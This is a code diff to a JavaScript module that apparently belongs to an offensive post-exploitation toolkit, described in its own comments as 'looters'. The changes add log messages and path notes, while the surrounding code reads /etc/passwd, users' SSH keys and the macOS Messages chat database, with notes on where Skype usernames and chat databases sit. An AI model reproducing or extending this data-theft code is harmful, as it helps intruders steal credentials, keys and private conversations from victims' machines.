@@ -11,9 +11,11 @@ define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
 
         // Main entry point for all looters
         execute: function() {
+            console.log('Looting the file system, please wait ...');
             var os = platform.operatingSystem();
             var _this = this;
             if (os === 'macos') {
+                console.log('Looting MacOS system');
                 this.fs.getHomeDirectory({
                     success: _this.lootMacOS,
                     failure: _this.lootMacOS
@@ -40,7 +42,9 @@ define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
 
         },
 
+        //
         // OS file looters
+        //
         passwd: function() {
             var _this = this;
             this.fs.getFile('/etc/passwd', {
@@ -50,7 +54,9 @@ define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
             });
         },
 
+        //
         // Application specific looting
+        //
         sshKeys: function(home) {
             var _this = this;
             
@@ -68,6 +74,10 @@ define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
         },
 
         messagesHistory: function(home) {
+            // Library/Messages/chat.db <-- Chat database, and paths to attachments
+            // Library/Messages/Attachments/<byte>/<byte>/<uuid>/<file>
+
+
             var _this = this;
             this.fs.getFile(home + '/Library/Messages/chat.db', {
                 success: function(data) {
@@ -77,6 +87,8 @@ define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
         },
 
         skypeHistory: function(home) {
+            // Library/Application Support/Skype/shared.xml  <-- Contains username
+            // Library/Application Support/Skype/<username>/main.db  <-- Chat database
 
 
         }
